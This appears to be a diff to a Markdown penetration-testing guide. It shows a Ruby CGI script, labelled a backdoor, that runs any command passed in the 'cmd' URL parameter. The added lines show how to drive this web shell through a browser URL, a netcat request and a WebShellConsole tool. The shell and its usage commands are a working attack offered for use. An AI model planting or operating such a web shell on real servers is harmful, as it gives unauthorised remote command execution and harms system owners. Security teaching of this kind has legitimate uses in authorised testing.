@@ -63,12 +63,39 @@ File.chmod(0200, file)  # To prevent ppl from browsing the log file
 if you have a server that supports ruby CGI, you can use the follwoing as backdoor
 ```ruby
 #!/usr/bin/env ruby
-# echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
 require 'cgi'
 cgi = CGI.new
 puts cgi.header
 system(cgi['cmd'])
 ```
+Now you can simple use browser, netcat or [^1]WebShellConsole to execute your commands.
+ex.
+**Brwoser**
+```
+http://host/cgi/shell.rb?cmd=ls -la
+```
+**Netcat**
+```
+echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc host 80
+```
+**WebShellConsole**
+
+run wsc
+```
+ruby wsc.rb
+```
+Add Shell url
+```
+Shell -> set http://host/cgi/shell.rb?cmd=
+```
+Now prompt your commands
+```
+Shell -> ls -la
+```
+
+<br><br>
+---
+[^1] [WebShellConsole](https://github.com/KINGSABRI/WebShellConsole) is simple interactive console, interacts with simple web shells using HTTP GET rather than using browser. wsc will work with any shell use GET method. It takes care of all url encoding too.
 
 
 
@@ -87,7 +114,3 @@ system(cgi['cmd'])
 
 
 
-
-
-
-sssssssssssssssssssssss
